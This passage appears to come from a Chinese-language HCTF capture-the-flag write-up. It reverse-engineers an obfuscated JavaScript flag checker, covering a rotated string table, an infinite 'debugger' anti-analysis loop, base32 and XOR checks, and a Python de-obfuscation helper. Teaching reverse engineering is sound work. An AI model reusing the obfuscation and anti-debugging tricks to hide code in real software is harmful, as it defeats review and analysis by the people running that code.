&apos;\\w+&apos;,</span><br><span class="line">    &apos;replace&apos;,</span><br><span class="line">    &apos;(3()&#123;(3 a()&#123;7&#123;(3 b(2)&#123;9((\&apos;\&apos;+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\&apos;4\&apos;)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&apos;,</span><br><span class="line">    &apos;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&apos;,</span><br><span class="line">    &apos;pop&apos;,</span><br><span class="line">    &apos;length&apos;,</span><br><span class="line">    &apos;join&apos;,</span><br><span class="line">    &apos;getElementById&apos;,</span><br><span class="line">    &apos;message&apos;,</span><br><span class="line">    &apos;log&apos;,</span><br><span class="line">    &apos;Welcome to HCTF:&gt;&apos;,</span><br><span class="line">    &apos;Congratulations! you got it!&apos;,</span><br><span class="line">    &apos;Sorry, you are wrong...&apos;,</span><br><span class="line">    &apos;window.console.clear();window.console.log(\&apos;Welcome to HCTF :&gt;\&apos;)&apos;,</span><br><span class="line">    &apos;version&apos;,</span><br><span class="line">    &apos;error&apos;,</span><br><span class="line">    &apos;download&apos;,</span><br><span class="line">    &apos;substring&apos;,</span><br><span class="line">    &apos;push&apos;,</span><br><span class="line">    &apos;Function&apos;,</span><br><span class="line">    &apos;charAt&apos;,</span><br><span class="line">    &apos;idle&apos;,</span><br><span class="line">    &apos;pyW5F1U43VI&apos;,</span><br><span class="line">    &apos;init&apos;,</span><br><span class="line">    &apos;https://the-extension.com&apos;,</span><br><span class="line">    &apos;local&apos;,</span><br><span class="line">    &apos;storage&apos;,</span><br><span class="line">    &apos;eval&apos;,</span><br><span class="line">    &apos;then&apos;,</span><br><span class="line">    &apos;get&apos;,</span><br><span class="line">    &apos;getTime&apos;,</span><br><span class="line">    &apos;setUTCHours&apos;,</span><br><span class="line">    &apos;origin&apos;,</span><br><span class="line">    &apos;set&apos;,</span><br><span class="line">    &apos;GET&apos;,</span><br><span class="line">    &apos;loading&apos;,</span><br><span class="line">    &apos;status&apos;,</span><br><span class="line">    &apos;removeListener&apos;,</span><br><span class="line">    &apos;onUpdated&apos;,</span><br><span class="line">    &apos;callee&apos;,</span><br><span class="line">    &apos;addListener&apos;,</span><br><span class="line">    &apos;onMessage&apos;,</span><br><span class="line">    &apos;runtime&apos;,</span><br><span class="line">    &apos;executeScript&apos;,</span><br><span class="line">    &apos;data&apos;,</span><br><span class="line">    &apos;test&apos;,</span><br><span class="line">    &apos;http://&apos;,</span><br><span class="line">    &apos;Url error&apos;,</span><br><span class="line">    &apos;query&apos;,</span><br><span class="line">    &apos;filter&apos;,</span><br><span class="line">    &apos;active&apos;,</span><br><span class="line">    &apos;floor&apos;</span><br><span class="line">];</span><br><span class="line">(function (_0xd4b7d6, _0xad25ab) &#123;</span><br><span class="line">    var _0x5e3956 = function (_0x1661d3) &#123;</span><br><span class="line">        while (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6.push(_0xd4b7d6.shift());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5e3956(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, 418));</span><br><span class="line">var _0xa180 = function (_0x5c351c, _0x2046d8) &#123;</span><br><span class="line">    _0x5c351c = _0x5c351c - 0;</span><br><span class="line">    var _0x26f3b3 = _0x180a[_0x5c351c];</span><br><span class="line">    return _0x26f3b3;</span><br><span class="line">&#125;;</span><br><span class="line">function check(_0x5b7c0c) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var _0x2e2f8d = [</span><br><span class="line">            &apos;code&apos;,</span><br><span class="line">            _0xa180(&apos;0x0&apos;),</span><br><span class="line">            _0xa180(&apos;0x1&apos;),</span><br><span class="line">            _0xa180(&apos;0x2&apos;),</span><br><span class="line">            &apos;invalidMonetizationCode&apos;,</span><br><span class="line">            _0xa180(&apos;0x3&apos;),</span><br><span class="line">            _0xa180(&apos;0x4&apos;),</span><br><span class="line">            _0xa180(&apos;0x5&apos;),</span><br><span class="line">            _0xa180(&apos;0x6&apos;),</span><br><span class="line">            _0xa180(&apos;0x7&apos;),</span><br><span class="line">            _0xa180(&apos;0x8&apos;),</span><br><span class="line">            _0xa180(&apos;0x9&apos;),</span><br><span class="line">            _0xa180(&apos;0xa&apos;),</span><br><span class="line">            _0xa180(&apos;0xb&apos;),</span><br><span class="line">            _0xa180(&apos;0xc&apos;),</span><br><span class="line">            _0xa180(&apos;0xd&apos;),</span><br><span class="line">            _0xa180(&apos;0xe&apos;),</span><br><span class="line">            _0xa180(&apos;0xf&apos;),</span><br><span class="line">            _0xa180(&apos;0x10&apos;),</span><br><span class="line">            _0xa180(&apos;0x11&apos;),</span><br><span class="line">            &apos;url&apos;,</span><br><span class="line">            _0xa180(&apos;0x12&apos;),</span><br><span class="line">            _0xa180(&apos;0x13&apos;),</span><br><span class="line">            _0xa180(&apos;0x14&apos;),</span><br><span class="line">            _0xa180(&apos;0x15&apos;),</span><br><span class="line">            _0xa180(&apos;0x16&apos;),</span><br><span class="line">            _0xa180(&apos;0x17&apos;),</span><br><span class="line">            _0xa180(&apos;0x18&apos;),</span><br><span class="line">            &apos;tabs&apos;,</span><br><span class="line">            _0xa180(&apos;0x19&apos;),</span><br><span class="line">            _0xa180(&apos;0x1a&apos;),</span><br><span class="line">            _0xa180(&apos;0x1b&apos;),</span><br><span class="line">            _0xa180(&apos;0x1c&apos;),</span><br><span class="line">            _0xa180(&apos;0x1d&apos;),</span><br><span class="line">            &apos;replace&apos;,</span><br><span class="line">            _0xa180(&apos;0x1e&apos;),</span><br><span class="line">            _0xa180(&apos;0x1f&apos;),</span><br><span class="line">            &apos;includes&apos;,</span><br><span class="line">            _0xa180(&apos;0x20&apos;),</span><br><span class="line">            &apos;length&apos;,</span><br><span class="line">            _0xa180(&apos;0x21&apos;),</span><br><span class="line">            _0xa180(&apos;0x22&apos;),</span><br><span class="line">            _0xa180(&apos;0x23&apos;),</span><br><span class="line">            _0xa180(&apos;0x24&apos;),</span><br><span class="line">            _0xa180(&apos;0x25&apos;),</span><br><span class="line">            _0xa180(&apos;0x26&apos;),</span><br><span class="line">            _0xa180(&apos;0x27&apos;),</span><br><span class="line">            _0xa180(&apos;0x28&apos;),</span><br><span class="line">            _0xa180(&apos;0x29&apos;),</span><br><span class="line">            &apos;toString&apos;,</span><br><span class="line">            _0xa180(&apos;0x2a&apos;),</span><br><span class="line">            &apos;split&apos;</span><br><span class="line">        ];</span><br><span class="line">        var _0x50559f = _0x5b7c0c[_0x2e2f8d[5]](0, 4);</span><br><span class="line">        var _0x5cea12 = parseInt(btoa(_0x50559f), 32);</span><br><span class="line">        console.log(_0x5cea12);</span><br><span class="line">        // eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) &#123;</span><br><span class="line">        //     _0x2d59cf = function (_0x4be75f) &#123;</span><br><span class="line">        //         return _0x4be75f.toString(_0x177f13);</span><br><span class="line">        //     &#125;;</span><br><span class="line">        //     if (!&apos;&apos;.replace(/^/, String)) &#123;</span><br><span class="line">        //         while (_0x46da6f--)</span><br><span class="line">        //             _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span><br><span class="line">        //         _0x802d91 = [function (_0x5e8f1a) &#123;</span><br><span class="line">        //                 return _0x2829f2[_0x5e8f1a];</span><br><span class="line">        //             &#125;];</span><br><span class="line">        //         _0x2d59cf = function () &#123;</span><br><span class="line">        //             return _0xa180(&apos;0x2b&apos;);</span><br><span class="line">        //         &#125;;</span><br><span class="line">        //         _0x46da6f = 1;</span><br><span class="line">        //     &#125;</span><br><span class="line">        //     ;</span><br><span class="line">        //     while (_0x46da6f--)</span><br><span class="line">        //         if (_0x802d91[_0x46da6f])</span><br><span class="line">        //             _0x200db2 = _0x200db2[_0xa180(&apos;0x2c&apos;)](new RegExp(&apos;\\b&apos; + _0x2d59cf(_0x46da6f) + &apos;\\b&apos;, &apos;g&apos;), _0x802d91[_0x46da6f]);</span><br><span class="line">        //     return _0x200db2;</span><br><span class="line">        // &#125;(_0xa180(&apos;0x2d&apos;), 17, 17, _0xa180(&apos;0x2e&apos;).split(&apos;|&apos;), 0, &#123;&#125;));</span><br><span class="line">        // (function (_0x3291b7, _0xced890) &#123;</span><br><span class="line">        //     var _0xaed809 = function (_0x3aba26) &#123;</span><br><span class="line">        //         while (--_0x3aba26) &#123;</span><br><span class="line">        //             _0x3291b7[_0xa180(&apos;0x4&apos;)](_0x3291b7.shift());</span><br><span class="line">        //         &#125;</span><br><span class="line">        //     &#125;;</span><br><span class="line">        //     _0xaed809(++_0xced890);</span><br><span class="line">        // &#125;(_0x2e2f8d, _0x5cea12 % 123));</span><br><span class="line">        var _0x43c8d1 = function (_0x3120e0) &#123;</span><br><span class="line">            var _0x3120e0 = parseInt(_0x3120e0, 16);</span><br><span class="line">            var _0x3a882f = _0x2e2f8d[_0x3120e0];</span><br><span class="line">            return _0x3a882f;</span><br><span class="line">        &#125;;</span><br><span class="line">        var _0x1c3854 = function (_0x52ba71) &#123;</span><br><span class="line">            var _0x52b956 = &apos;0x&apos;;</span><br><span class="line">            for (var _0x59c050 = 0; _0x59c050 &lt; _0x52ba71[_0x43c8d1(8)]; _0x59c050++) &#123;</span><br><span class="line">                _0x52b956 += _0x52ba71[_0x43c8d1(&apos;f&apos;)](_0x59c050)[_0x43c8d1(12)](16);</span><br><span class="line">            &#125;</span><br><span class="line">            return _0x52b956;</span><br><span class="line">        &#125;;</span><br><span class="line">        var _0x76e1e8 = _0x5b7c0c[_0x43c8d1(14)](&apos;_&apos;);</span><br><span class="line">        var _0x34f55b = (_0x1c3854(_0x76e1e8[0][_0x43c8d1(13)](-2, 2)) ^ _0x1c3854(_0x76e1e8[0][_0x43c8d1(13)](4, 1))) % _0x76e1e8[0][_0x43c8d1(8)] == 5;</span><br><span class="line">        if (!_0x34f55b) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        b2c = function (_0x3f9bc5) &#123;</span><br><span class="line">            var _0x3c3bd8 = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&apos;;</span><br><span class="line">            var _0x4dc510 = [];</span><br><span class="line">            var _0x4a199f = Math[_0xa180(&apos;0x25&apos;)](_0x3f9bc5[_0x43c8d1(8)] / 5);</span><br><span class="line">            var _0x4ee491 = _0x3f9bc5[_0x43c8d1(8)] % 5;</span><br><span class="line">            if (_0x4ee491 != 0) &#123;</span><br><span class="line">                for (var _0x1e1753 = 0; _0x1e1753 &lt; 5 - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += &apos;&apos;;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += 1;</span><br><span class="line">            &#125;</span><br><span class="line">            for (_0x1e1753 = 0; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)](_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5) &gt;&gt; 3));</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5) &amp; 7) &lt;&lt; 2 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 1) &gt;&gt; 6));</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 1) &amp; 63) &gt;&gt; 1));</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 1) &amp; 1) &lt;&lt; 4 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 2) &gt;&gt; 4));</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 2) &amp; 15) &lt;&lt; 1 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 3) &gt;&gt; 7));</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 3) &amp; 127) &gt;&gt; 2));</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 3) &amp; 3) &lt;&lt; 3 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 4) &gt;&gt; 5));</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)](_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 5 + 4) &amp; 31));</span><br><span class="line">            &#125;</span><br><span class="line">            var _0x545c12 = 0;</span><br><span class="line">            if (_0x4ee491 == 1)</span><br><span class="line">                _0x545c12 = 6;</span><br><span class="line">            else if (_0x4ee491 == 2)</span><br><span class="line">                _0x545c12 = 4;</span><br><span class="line">            else if (_0x4ee491 == 3)</span><br><span class="line">                _0x545c12 = 3;</span><br><span class="line">            else if (_0x4ee491 == 4)</span><br><span class="line">                _0x545c12 = 1;</span><br><span class="line">            for (_0x1e1753 = 0; _0x1e1753 &lt; _0x545c12; _0x1e1753++)</span><br><span class="line">                _0x4dc510[_0xa180(&apos;0x2f&apos;)]();</span><br><span class="line">            for (_0x1e1753 = 0; _0x1e1753 &lt; _0x545c12; _0x1e1753++)</span><br><span class="line">                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](&apos;=&apos;);</span><br><span class="line">            (function () &#123;</span><br><span class="line">                (function _0x3c3bd8() &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        (function _0x4dc510(_0x460a91) &#123;</span><br><span class="line">                            if ((&apos;&apos; + _0x460a91 / _0x460a91)[_0xa180(&apos;0x30&apos;)] !== 1 || _0x460a91 % 20 === 0) &#123;</span><br><span class="line">                                (function () &#123;</span><br><span class="line">                                &#125;.constructor(&apos;debugger&apos;)());</span><br><span class="line">                            &#125; else &#123;</span><br><span class="line">                                debugger;</span><br><span class="line">                            &#125;</span><br><span class="line">                            _0x4dc510(++_0x460a91);</span><br><span class="line">                        &#125;(0));</span><br><span class="line">                    &#125; catch (_0x30f185) &#123;</span><br><span class="line">                        setTimeout(_0x3c3bd8, 5000);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;());</span><br><span class="line">            &#125;());</span><br><span class="line">            return _0x4dc510[_0xa180(&apos;0x31&apos;)](&apos;&apos;);</span><br><span class="line">        &#125;;</span><br><span class="line">        e = _0x1c3854(b2c(_0x76e1e8[2])[_0x43c8d1(14)](&apos;=&apos;)[0]) ^ 87703346;</span><br><span class="line">        if (e != 1266420339) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        f = _0x1c3854(b2c(_0x76e1e8[3])[_0x43c8d1(14)](&apos;=&apos;)[0]) ^ e;</span><br><span class="line">        if (f != 70341426) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        n = f * e * _0x76e1e8[0][_0x43c8d1(8)];</span><br><span class="line">        h = function (_0x4c466e, _0x28871) &#123;</span><br><span class="line">            var _0x3ea581 = &apos;&apos;;</span><br><span class="line">            for (var _0x2fbf7a = 0; _0x2fbf7a &lt; _0x4c466e[_0x43c8d1(8)]; _0x2fbf7a++) &#123;</span><br><span class="line">                _0x3ea581 += _0x28871(_0x4c466e[_0x2fbf7a]);</span><br><span class="line">            &#125;</span><br><span class="line">            return _0x3ea581;</span><br><span class="line">        &#125;;</span><br><span class="line">        j = _0x76e1e8[1][_0x43c8d1(14)](&apos;3&apos;);</span><br><span class="line">        if (j[0][_0x43c8d1(8)] != j[1][_0x43c8d1(8)] || (_0x1c3854(j[0]) ^ _0x1c3854(j[1])) != 5651) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        k = _0xffcc52 =&gt; _0xffcc52[_0x43c8d1(&apos;f&apos;)]() * _0x76e1e8[1][_0x43c8d1(8)];</span><br><span class="line">        l = h(j[0], k);</span><br><span class="line">        if (l != 798707826) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        m = _0x1c3854(_0x76e1e8[4][_0x43c8d1(13)](0, 4)) - 1218466658 == n % l;</span><br><span class="line">        function _0x5a6d56(_0x5a25ab, _0x4a4483) &#123;</span><br><span class="line">            var _0x55b09f = &apos;&apos;;</span><br><span class="line">            for (var _0x508ace = 0; _0x508ace &lt; _0x4a4483; _0x508ace++) &#123;</span><br><span class="line">                _0x55b09f += _0x5a25ab;</span><br><span class="line">            &#125;</span><br><span class="line">            return _0x55b09f;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!m || _0x5a6d56(_0x76e1e8[4][_0x43c8d1(13)](5, 1), 2) == _0x76e1e8[4][_0x43c8d1(13)](-5, 4) || _0x76e1e8[4][_0x43c8d1(13)](-2, 1) - _0x76e1e8[4][_0x43c8d1(13)](4, 1) != 1) &#123;</span><br><span class="line">            return ![];</span><br><span class="line">        &#125;</span><br><span class="line">        o = _0x1c3854(_0x76e1e8[4][_0x43c8d1(13)](6, 2))[_0x43c8d1(13)](2) == _0x76e1e8[4][_0x43c8d1(13)](6, 1)[_0x43c8d1(&apos;f&apos;)]() * _0x76e1e8[4][_0x43c8d1(8)] * 5;</span><br><span class="line">        return o &amp;&amp; _0x76e1e8[4][_0x43c8d1(13)](4, 1) == 2 &amp;&amp; _0x76e1e8[4][_0x43c8d1(13)](6, 2) == _0x5a6d56(_0x76e1e8[4][_0x43c8d1(13)](7, 1), 2);</span><br><span class="line">    &#125; catch (_0x4cbb89) &#123;</span><br><span class="line">        console.log(&apos;gg&apos;);</span><br><span class="line">        return ![];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function test() &#123;</span><br><span class="line">    var _0x5bf136 = document[_0xa180(&apos;0x32&apos;)](_0xa180(&apos;0x33&apos;)).value;</span><br><span class="line">    if (_0x5bf136 == &apos;&apos;) &#123;</span><br><span class="line">        console[_0xa180(&apos;0x34&apos;)](_0xa180(&apos;0x35&apos;));</span><br><span class="line">        return ![];</span><br><span class="line">    &#125;</span><br><span class="line">    var _0x4d0e29 = check(_0x5bf136);</span><br><span class="line">    if (_0x4d0e29) &#123;</span><br><span class="line">        alert(_0xa180(&apos;0x36&apos;));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alert(_0xa180(&apos;0x37&apos;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">window.onload = function () &#123;</span><br><span class="line">    // setInterval(_0xa180(&apos;0x38&apos;), 50);</span><br><span class="line">    test();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分析语法，注释掉其中与分析无关的debug等操作，发现是直接前端读取标签input内容调用check函数进行判断，返回值得为1。</p><p>接着对字符串字面量混淆做逆向，发现是对某个字符串利用某个变换函数从已有的数组里做映射取值。使用浏览器把脚本直接放进去就可以拿到混淆前的真正字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">var _0x180a = [</span><br><span class="line">    &apos;random&apos;,</span><br><span class="line">    &apos;charCodeAt&apos;,</span><br><span class="line">    &apos;fromCharCode&apos;,</span><br><span class="line">    &apos;parse&apos;,</span><br><span class="line">    &apos;substr&apos;,</span><br><span class="line">    &apos;\\w+&apos;,</span><br><span class="line">    &apos;replace&apos;,</span><br><span class="line">    &apos;(3()&#123;(3 a()&#123;7&#123;(3 b(2)&#123;9((\&apos;\&apos;+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\&apos;4\&apos;)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&apos;,</span><br><span class="line">    &apos;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&apos;,</span><br><span class="line">    &apos;pop&apos;,</span><br><span class="line">    &apos;length&apos;,</span><br><span class="line">    &apos;join&apos;,</span><br><span class="line">    &apos;getElementById&apos;,</span><br><span class="line">    &apos;message&apos;,</span><br><span class="line">    &apos;log&apos;,</span><br><span class="line">    &apos;Welcome to HCTF:&gt;&apos;,</span><br><span class="line">    &apos;Congratulations! you got it!&apos;,</span><br><span class="line">    &apos;Sorry, you are wrong...&apos;,</span><br><span class="line">    &apos;window.console.clear();window.console.log(\&apos;Welcome to HCTF :&gt;\&apos;)&apos;,</span><br><span class="line">    &apos;version&apos;,</span><br><span class="line">    &apos;error&apos;,</span><br><span class="line">    &apos;download&apos;,</span><br><span class="line">    &apos;substring&apos;,</span><br><span class="line">    &apos;push&apos;,</span><br><span class="line">    &apos;Function&apos;,</span><br><span class="line">    &apos;charAt&apos;,</span><br><span class="line">    &apos;idle&apos;,</span><br><span class="line">    &apos;pyW5F1U43VI&apos;,</span><br><span class="line">    &apos;init&apos;,</span><br><span class="line">    &apos;https://the-extension.com&apos;,</span><br><span class="line">    &apos;local&apos;,</span><br><span class="line">    &apos;storage&apos;,</span><br><span class="line">    &apos;eval&apos;,</span><br><span class="line">    &apos;then&apos;,</span><br><span class="line">    &apos;get&apos;,</span><br><span class="line">    &apos;getTime&apos;,</span><br><span class="line">    &apos;setUTCHours&apos;,</span><br><span class="line">    &apos;origin&apos;,</span><br><span class="line">    &apos;set&apos;,</span><br><span class="line">    &apos;GET&apos;,</span><br><span class="line">    &apos;loading&apos;,</span><br><span class="line">    &apos;status&apos;,</span><br><span class="line">    &apos;removeListener&apos;,</span><br><span class="line">    &apos;onUpdated&apos;,</span><br><span class="line">    &apos;callee&apos;,</span><br><span class="line">    &apos;addListener&apos;,</span><br><span class="line">    &apos;onMessage&apos;,</span><br><span class="line">    &apos;runtime&apos;,</span><br><span class="line">    &apos;executeScript&apos;,</span><br><span class="line">    &apos;data&apos;,</span><br><span class="line">    &apos;test&apos;,</span><br><span class="line">    &apos;http://&apos;,</span><br><span class="line">    &apos;Url error&apos;,</span><br><span class="line">    &apos;query&apos;,</span><br><span class="line">    &apos;filter&apos;,</span><br><span class="line">    &apos;active&apos;,</span><br><span class="line">    &apos;floor&apos;</span><br><span class="line">];</span><br><span class="line">(function (_0xd4b7d6, _0xad25ab) &#123;</span><br><span class="line">    var _0x5e3956 = function (_0x1661d3) &#123;</span><br><span class="line">        while (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6.push(_0xd4b7d6.shift());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5e3956(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, 418));</span><br><span class="line">var _0xa180 = function (_0x5c351c, _0x2046d8) &#123;</span><br><span class="line">    _0x5c351c = _0x5c351c - 0;</span><br><span class="line">    var _0x26f3b3 = _0x180a[_0x5c351c];</span><br><span class="line">    return _0x26f3b3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>check函数里的字符串类似于_0xa180(‘0x19’)，扔到浏览器就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a = [&quot;window.console.clear();window.console.log(&apos;Welcome to HCTF :&gt;&apos;)&quot;,&quot;Sorry, you are wrong...&quot;,&quot;Congratulations! you got it!&quot;,&quot;Welcome to HCTF:&gt;&quot;,&quot;log&quot;,&quot;message&quot;,&quot;getElementById&quot;,&quot;join&quot;,&quot;length&quot;,&quot;pop&quot;,&quot;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&quot;,&quot;(3()&#123;(3 a()&#123;7&#123;(3 b(2)&#123;9((&apos;&apos;+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(&apos;4&apos;)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&quot;,&quot;replace&quot;,&quot;\w+&quot;,&quot;substr&quot;,&quot;parse&quot;,&quot;fromCharCode&quot;,&quot;charCodeAt&quot;,&quot;random&quot;,&quot;floor&quot;,&quot;active&quot;,&quot;filter&quot;,&quot;query&quot;,&quot;Url error&quot;,&quot;http://&quot;,&quot;test&quot;,&quot;data&quot;,&quot;executeScript&quot;,&quot;runtime&quot;,&quot;onMessage&quot;,&quot;addListener&quot;,&quot;callee&quot;,&quot;onUpdated&quot;,&quot;removeListener&quot;,&quot;status&quot;,&quot;loading&quot;,&quot;GET&quot;,&quot;set&quot;,&quot;origin&quot;,&quot;setUTCHours&quot;,&quot;getTime&quot;,&quot;get&quot;,&quot;then&quot;,&quot;eval&quot;,&quot;storage&quot;,&quot;local&quot;,&quot;https://the-extension.com&quot;,&quot;init&quot;,&quot;pyW5F1U43VI&quot;,&quot;idle&quot;,&quot;charAt&quot;,&quot;Function&quot;,&quot;push&quot;,&quot;substring&quot;,&quot;download&quot;,&quot;error&quot;,&quot;version&quot;]</span><br><span class="line">a = a[::-1]</span><br><span class="line"># print len(a)</span><br><span class="line"># for i in range(57):</span><br><span class="line"># print i</span><br><span class="line">for i in range(57):</span><br><span class="line">s = &quot;_0xa180(&apos;&quot;+hex(i)+&quot;&apos;)&quot;</span><br><span class="line">t = a[i]</span><br><span class="line"># print s</span><br><span class="line"># print t</span><br><span class="line">with open(&quot;hun.js&quot; , &quot;r+&quot;)as f :</span><br><span class="line">lines=f.readlines()</span><br><span class="line">f.seek(0) </span><br><span class="line">f.truncate()</span><br><span class="line">for l in lines:</span><br><span class="line">f.write(l.replace(s , &quot;&apos;&quot;+t+&quot;&apos;&quot;))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p><p>通过一段小py替换js里混淆的数组得到check函数里用到的数组</p><p>分析check函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var shuru_1 = shuru.substring(0, 4);</span><br><span class="line">var shuru_2 = parseInt(btoa(shuru_1), 32); // 31</span><br><span class="line"></span><br><span class="line">(function (shuzu, shuru) &#123;</span><br><span class="line">    var shift = function (i) &#123;</span><br><span class="line">        while (--i) &#123;</span><br><span class="line">            shuzu.push(shuzu.shift());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    shift(++shuru);</span><br><span class="line">&#125;(shuzu_2, shuru_2 % 123));</span><br></pre></td></tr></table></figure></p><p>首先是取输入前五位base64编码以32进制解析base64结果得到一个数字，以该数字对数组2移位变换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var shuzu_2_yingshe = function (shuzi) 